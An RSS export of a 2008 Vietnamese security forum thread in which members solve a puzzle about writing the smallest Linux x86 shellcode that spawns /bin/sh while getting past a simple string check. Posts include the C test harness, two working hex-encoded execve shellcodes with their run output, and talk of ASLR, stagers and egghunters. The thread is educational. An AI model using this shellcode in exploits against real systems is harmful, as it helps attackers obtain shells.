@@ -1,0 +1,290 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "[ Thảo luận ] - Về Shellcode trên linux"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/24.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "[ Thảo luận ] - Về Shellcode trên linux"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>[ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Tình hình là dạo gần đây khoai rất có duyên với mấy cái shellcode + buffer overflow. Hôm trước có gặp phải một "bài tập" nhỏ, khá hay nên post lên đây để bà con thảo luận chơi cho vui.
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/* testshell.c */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#define bufsz 100
+const char msg&#91;&#93;="Usage: %s &lt;shellcode file&gt;\n";
+static char buffer1&#91;bufsz&#93;;
+static char buffer2&#91;bufsz&#93;;
+void usage&#40;char *self&#41;
+{
+        printf&#40;msg, self&#41;;
+        exit&#40;1&#41;;
+}
+
+int main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+        FILE *fp;
+        void &#40;*funcptr&#41;&#40;&#41;;
+        if &#40;argc != 2&#41; usage&#40;argv&#91;0&#93;&#41;;
+        if &#40;&#40;fp=fopen&#40;argv&#91;1&#93;, "rb"&#41;&#41;==NULL&#41; {
+                printf&#40;"fail to open file: %s\n", argv&#91;1&#93;&#41;;
+                exit&#40;1&#41;;
+        }
+        fgets&#40;buffer1, bufsz, fp&#41;;
+        fclose&#40;fp&#41;;
+        strcpy&#40;buffer2, buffer1&#41;;/* your shellcode should not contain 0x0*/
+        if &#40;strlen&#40;buffer2&#41;&gt;=50&#41; /* your shellcode should be less than 40 bytes */
+                printf&#40;"your shellcode is too long! 5 points penalty \n"&#41;;
+        if &#40;strlen&#40;buffer2&#41;&lt;30&#41;  /* the shorter, the better the shell code is */
+                printf&#40;"your shellcode is less than 30 bytes! 10 bonus points\n"&#41;;
+	if &#40;strstr&#40;buffer2, "/bin/sh"&#41;&#41;
+		printf&#40;"Malicious code detected! 15 points penalty \n"&#41;;
+	funcptr = &#40;void *&#41; buffer2;
+	&#40;*funcptr&#41;&#40;&#41;;  /* execute your shell code */
+	return 0 ;
+}</pre>
+		</div>
+Nhiệm vụ của mình là phải thiết kế một binary file chứa shellcode sao cho:
+1. Shellcode phải work. Và phải spawn /bin/sh (không chơi shell khác )
+2. Shellcode phải nhỏ. Càng nhỏ càng tốt.
+3. Shellcode phải né string /bin/sh vì chương trình testshell sẽ kiểm tra string đó.
+
+Các bạn thử viết một cái shellcode thỏa mãn các điều kiện trên xem? Và size nhỏ nhất là bao nhiêu? Các bạn dùng cách nào để có được size nhỏ như vây?
+
+Thông tin thêm về gcc:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$  gcc -v
+Reading specs from /usr/lib/gcc-lib/i386-slackware-linux/3.2.2/specs
+Configured with: ../gcc-3.2.2/configure --prefix=/usr --enable-shared --enable-threads=posix --enable-__cxa_atexit --disable-checking --with-gnu-ld --verbose --target=i386-slackware-linux --host=i386-slackware-linux
+Thread model: posix
+gcc version 3.2.2</pre>
+		</div>
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152172</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152172</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 10:54:31]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Anh Khoai chạy thử :
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' &gt;input</pre>
+		</div>
+rồi chạy
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>./testshell input</pre>
+		</div>
+PS: strlen(shellcode &gt;30) && strlen(shellcode &lt;50) thì ko được point nào ?? :-/ ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152189</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152189</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 12:38:27]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Đáp án này có vẻ khả thi hơn
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' &gt;sh3llc0d3</pre>
+		</div>
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>./testshell sh3llc0d3
+your shellcode is less than 30 bytes! 10 bonus points
+$</pre>
+		</div>
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152201</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152201</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 13:19:52]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Hello Cognac,
+
+Nếu shell lớn hơn 50 bytes --&gt; 10 points penalty
+Nếu shell ỡ giữa 30-50 : không có penalty, cũng không có bonus
+Nếu shell bé hơn 30 bytes --&gt; 10 points bonus.
+
+Không thèm cái shellcode của bồ, mà cần code + giải thích vì đâu có được đống bytes như vậy? Tại sao push giá trị "abcd" lên stack? vân vân.
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152206</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152206</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 14:22:05]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Mr.Khoai: chưa làm thử, nhưng ý tưởng thì thế này:
+
+1. giới hạn 30 bytes thì kô khó, chỉ cần khoảng 24 byte là đã có thể làm shellcode để spawn /bin/sh
+
+2. còn dư 6 byte, dùng 6 byte này để làm biến mất chuỗi /bin/sh. Cái này thì có nhiều cách để làm, chẳng hạn như đưa vào chuỗi /bin/sx rồi sửa lại cho nó thành /bin/sh.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152239</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152239</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 20:24:33]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ @MrKhoai: Bạn chuyển đoạn shellcode của mình sang assembly dùm, mình sẽ nhờ mọi người giải thích :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152262</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152262</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 22:41:47]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ anh mrro,
+
+"Bài" này không giới hạn độ dài tối đa ở 30 bytes. Cái khoai đang tìm là một shellcode thật nhỏ. Nhỏ nhất là bao nhiêu thì khoai không biết. Nhưng khoai đã mò được một cái chỉ với 16 bytes, spawn /bin/sh và không bị la lên là "malicious code detected"
+
+Cognac,
+
+Ủa, cứ tưởng code asm là của bồ viết chứ, sao lại bảo khoai chuyển từ shellcode qua assembly? 
+
+to all,
+
+Bài này làm chơi cho vui. Đừng vướng vào lối mòn khi suy nghĩ. Nghĩ thoáng một chút sẽ tìm được một con shellcode hiệu quả mà kích thước lại nhỏ
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152311</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152311</link>
+				<pubDate><![CDATA[Sun, 21 Sep 2008 07:16:31]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>anh mrro,
+
+"Bài" này không giới hạn độ dài tối đa ở 30 bytes. Cái khoai đang tìm là một shellcode thật nhỏ. Nhỏ nhất là bao nhiêu thì khoai không biết. Nhưng khoai đã mò được một cái chỉ với 16 bytes, spawn /bin/sh và không bị la lên là "malicious code detected"
+
+Cognac,
+
+<font color='orange'>Ủa, cứ tưởng code asm là của bồ viết chứ, sao lại bảo khoai chuyển từ shellcode qua assembly? </font>
+
+to all,
+
+Bài này làm chơi cho vui. Đừng vướng vào lối mòn khi suy nghĩ. Nghĩ thoáng một chút sẽ tìm được một con shellcode hiệu quả mà kích thước lại nhỏ
+
+khoai&nbsp;
+		</blockquote>
+nói chơi một câu mà khó chịu vậy bồ  :). Thực tế spawshell trong trường hợp này thì chắc hẳn là bạn khai thác kiểu "local exploit" chứ ko phải "remote exploit" nên thay vì chúng ta mất 10 byte để push chuỗi /bin/sh, thì cất chuỗi đó trong biến môi trường rồi push vào, tiết kiệm được 5 byte. Bồ có chịu kiểu này ko?  :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152478</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152478</link>
+				<pubDate><![CDATA[Mon, 22 Sep 2008 13:23:27]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ @Mr.Khoai: thế thì dùng lại cái "/bin/sh" trong code :-p. bây giờ giả sử biên dịch với tùy chọn -fpic và ASLR được kích hoạt, thì làm sao ;)?
+
+-m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152484</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152484</link>
+				<pubDate><![CDATA[Mon, 22 Sep 2008 13:44:28]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Cognac,
+
+Cái này không phải là exploit đâu, đơn giản chỉ là một bài tập để thiết kế cái shellcode mà thôi. Khoai có chịu không thì đâu có quan trọng, quan trọng là bồ "rút" ra được cái gì từ bài này :)
+
+anh mrro,
+
+Đúng là khoai dùng lại chính cái /bin/sh trong testshell. Đây là một ví dụ khá rõ cho hiện tượng nhét thêm một defense system vào hệ thống, nhưng lại vô tình tạo ra weakpoint khiến cho mục tiêu (ở đây là size shellcode phải nhỏ) dễ thực hiện hơn.
+
+Còn hai cái options kia phải làm sao là cả một vấn đề còn đang suy nghĩ ;)
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152590</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152590</link>
+				<pubDate><![CDATA[Tue, 23 Sep 2008 03:50:04]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ @Mr.Khoai: nói về shellcode có độ dài nhỏ thì tớ biết hiện tại đa số người ta sử dụng các stager hoặc các egghunter.
+
+Stager là một đoạn shellcode rất nhỏ, đóng vai trò là cầu nối giữa attacker với vulnerable application, và từ đó mở cửa (thường là thông qua network, sử dụng lại cái socket descriptor đang mở luôn) để đón nhận các stage từ attacker gửi sang tiếp. Các stage này mới chính là payload thứ thiệt với độ dài không giới hạn, nên có thể làm nhiều chuyện *kinh hoàng* :-p.
+
+Còn egghunter là dạng shellcode dùng để đi tìm shellcode khác mà mình biết là nằm đâu đó trong memory của vulnerable application, nhưng không biết chính xác nằm ở đâu. Egghunter cũng có độ dài rất nhỏ, chỉ vài mươi byte.
+
+Không biết có còn kỹ thuật nào không nhỉ?
+
+--m
+
+PS: àh nếu mà kích hoạt ASLR với -fpic lên thì bắt buộc phải nhét /bin/sh vào thôi, như cách của Cognac làm chẳng hạn.
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152595</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152595</link>
+				<pubDate><![CDATA[Tue, 23 Sep 2008 05:46:07]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Khà khà, anh mrro, khoai vừa mới thử với -fpic thì shellcode cũ vẫn work :)
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ gcc -v
+Reading specs from /usr/lib/gcc-lib/i386-slackware-linux/3.2.2/specs
+Configured with: ../gcc-3.2.2/configure --prefix=/usr --enable-shared --enable-threads=posix --enable-__cxa_atexit --disable-checking --with-gnu-ld --verbose --target=i386-slackware-linux --host=i386-slackware-linux
+Thread model: posix
+gcc version 3.2.2
+$ gcc -o testshell1 -fpic -g testshell.c 
+$ ./testshell1 SC1
+your shellcode is less than 30 bytes! 10 bonus points
+sh-2.05b$</pre>
+		</div>
+SC1 vẫn sử dụng string /bin/sh trong testsh chứ không push string đó lên stack. Thử tiếp với ASLR thì SC1 vẫn work. Lý do: Đã nói cái này không phải là exploit, đơn giản là một bài tập thiết kế shellcode. Các protection mechanism có ứng dụng cũng chưa chắc có hiệu quả:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ sysctl kernel.randomize_va_space
+kernel.randomize_va_space = 1
+$ gcc -fpic -o testshell -g testshell.c
+$ ./testshell SC1
+your shellcode is less than 30 bytes! 10 bonus points
+sh-2.05b$</pre>
+		</div>
+
+Thử build lại với gcc 4.1.2 thì lại khác. SC1 bị segfault. Nhưng cũng may mắn mò được một cách khác tạo ra được một shellcode nhỏ hơn (15 bytes). Vẫn sử dụng string /bin/sh trong testshell, nhưng do gcc khác version khiến cho vị trí của string này trong stack "thuận tiện" khi sử dụng. khoai sẽ report cụ thể các shell code sau.
+
+stager và egghunter thì lần đầu tiên khoai nghe nói. Thanks anh mrro, sẽ xem qua về hai anh này.
+
+khoai
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152601</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152601</link>
+				<pubDate><![CDATA[Tue, 23 Sep 2008 09:27:23]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ @Mr.Khoai: haha tớ nhầm, ngồi nhìn mã assembly thấy nó dùng relative addressing nên cứ ngỡ là nó sẽ ngẫu nhiên đâu đó. mà ngồi nghĩ lại thì mấy cái chuỗi như "/bin/sh" trong trường hợp này thể nào cũng sẽ bị nhét vào .rodata segment thôi, nên có -fPIC hay kô thì cũng vậy. thx Mr.Khoai.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152641</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25139.hva#152641</link>
+				<pubDate><![CDATA[Tue, 23 Sep 2008 12:38:06]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+	</channel>
+</rss>
